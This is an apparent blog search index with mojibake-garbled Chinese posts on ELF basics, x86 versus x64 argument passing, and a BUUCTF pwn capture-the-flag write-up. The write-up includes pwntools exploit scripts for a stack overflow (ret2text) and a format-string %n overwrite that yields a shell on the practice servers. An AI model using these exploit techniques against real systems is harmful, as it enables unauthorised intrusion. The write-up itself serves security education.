class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>æ‰“é€šï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢ELF</title>
      <link href="/2023/12/01/first-exploration-ELF/"/>
      <url>/2023/12/01/first-exploration-ELF/</url>
      
        <content type="html"><![CDATA[<p>æµ…æµ…åœ°äº†è§£ä¸‹ELFæ–‡ä»¶ï¼Œä»¥åä¼šä»å¤šä¸ªè§’åº¦åå¤é˜è¿°ã€‚<span id="more"></span></p><p><img src="/2023/12/01/first-exploration-ELF/elf.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32ä½ä¼ å‚ VS 64ä½ä¼ å‚</title>
      <link href="/2023/11/20/i386-VS-AMD64/"/>
      <url>/2023/11/20/i386-VS-AMD64/</url>
      
        <content type="html"><![CDATA[<p>å¯¹32ä½ä¼ å‚å’Œ64ä½ä¼ å‚çš„æ¯”è¾ƒ<span id="more"></span></p><blockquote><p>i386=Intel 80386ã€‚å…¶å®i386é€šå¸¸è¢«ç”¨æ¥ä½œä¸ºå¯¹Intelï¼ˆè‹±ç‰¹å°”ï¼‰32ä½å¾®å¤„ç†å™¨çš„ç»Ÿç§°ã€‚<br>AMD64ï¼Œåˆç§°â€œx86-64â€æˆ–â€œx64â€ï¼Œæ˜¯ä¸€ç§64ä½å…ƒçš„ç”µè„‘å¤„ç†å™¨æ¶æ„ã€‚å®ƒæ˜¯å»ºåŸºäºç°æœ‰32ä½å…ƒçš„x86æ¶æ„ï¼Œç”±AMDå…¬å¸æ‰€å¼€å‘ã€‚</p></blockquote><p>2ä½ä½¿ç”¨æ ˆå¸§ï¼ˆæ ˆå¸§æ˜¯æŒ‡å‡½æ•°åœ¨è¢«è°ƒç”¨æ—¶ï¼Œæ‰€æ‹¥æœ‰çš„ä¸€å—ç‹¬ç«‹çš„ç”¨äºå­˜æ”¾å‡½æ•°æ‰€ä½¿ç”¨çš„çŠ¶æ€å’Œå˜é‡çš„æ ˆç©ºé—´ã€‚ æ¯ä¸ªå‡½æ•°éƒ½å¯¹åº”æœ‰ä¸€ä¸ªæ ˆå¸§ã€‚ åŒä¸€ä¸ªå‡½æ•°å¤šæ¬¡è¿›å…¥ï¼Œæ¯æ¬¡å¯èƒ½ä¼šåˆ†é…åˆ°ä¸åŒçš„æ ˆå¸§ã€‚ æ•´ä¸ªæ ˆçš„å†…å®¹åœ¨åŒä¸€ä¸ªæ—¶åˆ»å¯ä»¥çœ‹ä½œæ˜¯ç”±è®¸å¤šæ ˆå¸§ä¾åºâ€œå †å â€ç»„æˆçš„ã€‚ï¼‰æ¥ä½œä¸ºä¼ é€’çš„å‚æ•°çš„ä¿å­˜ä½ç½®ï¼Œè€Œ64ä½ä½¿ç”¨å¯„å­˜å™¨ï¼Œåˆ†åˆ«ç”¨rdi,rsi,rdx,rcx,r8,r9ä½œä¸ºç¬¬1-6ä¸ªå‚æ•°ï¼Œå½“å‚æ•°ä¸º7ä¸ªä»¥ä¸Šæ—¶ï¼Œ å‰ 6 ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œ ä½†åé¢çš„ä¾æ¬¡ä» â€œå³å‘å·¦â€ æ”¾å…¥æ ˆä¸­ï¼Œå³å’Œ32ä½æ±‡ç¼–ä¸€æ ·ã€‚raxä½œä¸ºè¿”å›å€¼ 64ä½æ²¡æœ‰æ ˆå¸§çš„æŒ‡é’ˆï¼Œ32ä½ç”¨ebpä½œä¸ºæ ˆå¸§æŒ‡é’ˆï¼Œ64ä½å–æ¶ˆäº†è¿™ä¸ªè®¾å®šï¼Œrbpä½œä¸ºé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_pwn_wp</title>
      <link href="/2023/11/18/buuctf-pwn-wp/"/>
      <url>/2023/11/18/buuctf-pwn-wp/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€äº›pwné¢˜wp<span id="more"></span></p><h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>æµ‹è¯•ncï¼Œ ls çœ‹åˆ°æœ‰flagï¼Œ cat flagå¾—åˆ°flagã€‚<br><img src="/2023/11/18/buuctf-pwn-wp/test_your_nc.png">  </p><blockquote><p>ncæ˜¯<a href="https://so.csdn.net/so/search?q=netcat&amp;spm=1001.2101.3001.7020">netcat</a>çš„ç®€å†™</p><p>ï¼ˆ1ï¼‰å®ç°ä»»æ„TCP/UDPç«¯å£çš„ä¾¦å¬ï¼Œncå¯ä»¥ä½œä¸ºserverä»¥TCPæˆ–UDPæ–¹å¼ä¾¦å¬æŒ‡å®šç«¯å£<br>ï¼ˆ2ï¼‰ç«¯å£çš„æ‰«æï¼Œncå¯ä»¥ä½œä¸ºclientå‘èµ·TCPæˆ–UDPè¿æ¥<br>ï¼ˆ3ï¼‰æœºå™¨ä¹‹é—´ä¼ è¾“æ–‡ä»¶<br>ï¼ˆ4ï¼‰æœºå™¨ä¹‹é—´ç½‘ç»œæµ‹é€Ÿ</p></blockquote><p><code>nc [-hlnruz][-g&lt;ç½‘å…³...&gt;][-G&lt;æŒ‡å‘å™¨æ•°ç›®&gt;][-i&lt;å»¶è¿Ÿç§’æ•°&gt;][-o&lt;è¾“å‡ºæ–‡ä»¶&gt;][-p&lt;é€šä¿¡ç«¯å£&gt;][-s&lt;æ¥æºä½å€&gt;][-v...][-w&lt;è¶…æ—¶ç§’æ•°&gt;][ä¸»æœºåç§°][é€šä¿¡ç«¯å£...]</code></p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>æ‹–åˆ°idaé‡Œé¢çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªå±é™©å‡½æ•°get ï¼Œå®ƒä»ä¸æ£€æŸ¥è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œæ˜¯ä»¥å›è½¦æ¥åˆ¤æ–­è¾“å…¥æ˜¯å¦ç»“æŸï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å¯ä»¥å¯¼è‡´æ ˆæº¢å‡ºã€‚é¡ºä¾¿ä¹ŸçŸ¥é“äº†15ä¸ªå­—èŠ‚çš„å­˜å‚¨ç©ºé—´ï¼Œé‚£ä¹ˆåœ¨æ ˆå¸§ä¸­ç³»ç»Ÿå°±ä¼šç»™æˆ‘ä»¬åˆ†é…ä¸€ä¸ª15ä¸ªå­—èŠ‚çš„å­˜å‚¨ç©ºé—´<br><img src="/2023/11/18/buuctf-pwn-wp/rip.png"><br>funå‡½æ•°é‡Œé¢å‘ç°äº†systemå‡½æ•°ï¼Œsystemæ˜¯cè¯­è¨€ä¸‹çš„ä¸€ä¸ªå¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„å‡½æ•°ï¼Œç›®å‰å¯ä»¥ç®€å•ç†è§£ä¸ºï¼Œæ‰§è¡Œäº†è¿™ä¸ªå±é™©å‡½æ•°ï¼Œæˆ‘ä»¬å°±æ‹¿åˆ°äº†è¿œç«¯æœåŠ¡å™¨çš„shellï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºåœ¨windowsä¸‹ä»¥ç®¡ç†å‘˜èº«ä»½å¼€å¯cmdï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸€ç³»åˆ—åç»­æŒ‡ä»¤æ§åˆ¶è¿œç«¯æœåŠ¡å™¨ã€‚<br><img src="/2023/11/18/buuctf-pwn-wp/rip1.png"><br>ç¼–å†™è„šæœ¬<br><img src="/2023/11/18/buuctf-pwn-wp/rip2.png"><br>ls çœ‹åˆ°flagçš„æ–‡ä»¶ï¼Œcat flag<br><img src="/2023/11/18/buuctf-pwn-wp/rip3.png"></p><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p><img src="/2023/11/18/buuctf-pwn-wp/warmup_csaw_2016%201.png"><br>64ä½æ–‡ä»¶ï¼Œè€Œä¸”æ²¡æœ‰å¼€å¯ä¿æŠ¤<br>æ‹–è¿›ida<br><img src="/2023/11/18/buuctf-pwn-wp/warm2.png"><br> <img src="/2023/11/18/buuctf-pwn-wp/warm4.png"><br>å‘ç°å±é™©å‡½æ•°_getsï¼Œè¿˜çœ‹åˆ°äº†systemå‡½æ•°<br>ç¼–å†™payloadè„šæœ¬<br><img src="/2023/11/18/buuctf-pwn-wp/warmup4.png"><br><img src="/2023/11/18/buuctf-pwn-wp/warm3.png"></p><hr><h1 id="ç¬¬äºŒå‘¨"><a href="#ç¬¬äºŒå‘¨" class="headerlink" title="ç¬¬äºŒå‘¨"></a>ç¬¬äºŒå‘¨</h1><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p><img src="/2023/11/18/buuctf-pwn-wp/2019.png"><br>å‘ç°å¼€å¯äº†NXï¼Œæ— æ³•ç”¨shellcode<br>ä¸¢åˆ°ida  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);<span class="comment">// è®¾ç½®æ ‡å‡†è¾“å‡º _bss_start çš„ç¼“å†²æ–¹å¼</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>); <span class="comment">// è®¾ç½®æ ‡å‡†è¾“å…¥ stdin çš„ç¼“å†²æ–¹å¼</span></span><br><span class="line">  func(); <span class="comment">// è°ƒç”¨ func å‡½æ•°</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>å†çœ‹funcå‡½æ•°  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="comment">//é¦–å…ˆå£°æ˜äº†ä¸€ä¸ªé•¿åº¦ä¸º 44 çš„å­—ç¬¦æ•°ç»„ v1 å’Œä¸€ä¸ªæµ®ç‚¹æ•° v2</span></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's guess the number."</span>); <span class="comment">//è¾“å‡ºæç¤ºä¿¡æ¯ "Let's guess the number."</span></span><br><span class="line">  gets(v1); <span class="comment">//ä½¿ç”¨ gets å‡½æ•°ï¼ˆå±é™©å‡½æ•°ï¼‰æ¥æ”¶è¾“å…¥ï¼Œå­˜å‚¨åœ¨ v1 ä¸­</span></span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">"cat /flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Its value should be 11.28125"</span>);</span><br><span class="line">    <span class="comment">//æœ€åï¼Œé€šè¿‡æ¯”è¾ƒ v2 æ˜¯å¦ç­‰äº 11.28125ï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™æ‰§è¡Œ "cat /flag"ï¼Œå¦åˆ™è¾“å‡º "Its value should be 11.28125"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>æ‰¾åˆ°systemå‡½æ•°çš„åœ°å€<br><img src="/2023/11/18/buuctf-pwn-wp/20191.png"><br>å†™payload  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªä¸è¿œç¨‹ä¸»æœºé€šä¿¡çš„è¿æ¥</span></span><br><span class="line">p = remote(<span class="string">"node4.buuoj.cn"</span>, <span class="number">28403</span>) </span><br><span class="line"><span class="comment"># æ„é€  payloadï¼Œå…¶ä¸­åŒ…å« 'a'*(0x30+8) çš„å¡«å……å’Œ 0x4006BE çš„åœ°å€</span></span><br><span class="line">payload = <span class="string">b'a'</span> * (<span class="number">0x30</span> + <span class="number">8</span>) + p64(<span class="number">0x4006BE</span>)</span><br><span class="line"><span class="comment"># å‘é€ payload åˆ°è¿œç¨‹ä¸»æœº</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># ä¸è¿œç¨‹ä¸»æœºè¿›è¡Œäº¤äº’ï¼Œå¯ä»¥æ‰‹åŠ¨è¾“å…¥æˆ–è€…ä½¿ç”¨è„šæœ¬è¿›è¡Œè¿›ä¸€æ­¥çš„æ“ä½œ</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/11/18/buuctf-pwn-wp/20192.png">  </p><h1 id="ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5"><a href="#ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5" class="headerlink" title="[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5"></a>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</h1><p><img src="/2023/11/18/buuctf-pwn-wp/pwn5.png"><br>32ä½æ–‡ä»¶ï¼Œå¼€å¯äº†æ ˆæº¢å‡ºä¿æŠ¤ï¼Œå¼€å¯äº†NX<br>ä¸¢åˆ°idaé‡Œ  </p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF //å®šä¹‰ä¸€ä¸ªé•¿åº¦ä¸º100çš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">srand</span>(v1);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your name:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x63</span>u); <span class="comment">//ç­‰å¾…ç”¨æˆ·åœ¨ç»ˆç«¯æ”¶å…¥ï¼Œå­˜å…¥bufä¸­ï¼Œæœ€å¤šè¯»å–0x63uï¼ˆ99ï¼‰ä¸ªå­—èŠ‚</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello,"</span>); <span class="comment">// å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your passwd:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">atoi</span>(nptr) == dword_804C044 ) <span class="comment">// åªè¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶å°±å¯ä»¥å¾—åˆ°flag</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"ok!!"</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fail"</span>);</span><br><span class="line">  }</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    <span class="built_in">sub_80493D0</span>();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>è®¡ç®—åç§»é‡ä½10<br><img src="/2023/11/18/buuctf-pwn-wp/pwn51.png"><br>å†™ä¸‹è„šæœ¬  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node4.buuoj.cn'</span>,<span class="number">29083</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"AAAA%16$n%17$n%18$n%19$n"</span> + p32(bss) + p32(bss+<span class="number">1</span>) + p32(bss+<span class="number">2</span>) + p32(bss+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x04040404</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>cat falg<br><img src="/2023/11/18/buuctf-pwn-wp/pwn53.png"></p><h1 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h1><p>checksec,32ä½æ–‡ä»¶ï¼Œ<br><img src="/2023/11/18/buuctf-pwn-wp/shellcode_asm0.png">    </p><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>checksecæŸ¥çœ‹ä¸‹ä¿æŠ¤ 64 ä½æ–‡ä»¶ï¼Œå¼€å¯äº†NXæ— æ³•ä½¿ç”¨shellcode<br><img src="/2023/11/18/buuctf-pwn-wp/2019c.png"><br>ä¸¢åˆ°idaé‡ŒæŸ¥çœ‹<br>å‘ç°encryptå‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œå¤§æ¦‚æ˜¯æ ˆæº¢å‡º<br><img src="/2023/11/18/buuctf-pwn-wp/2019c1.png">  </p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
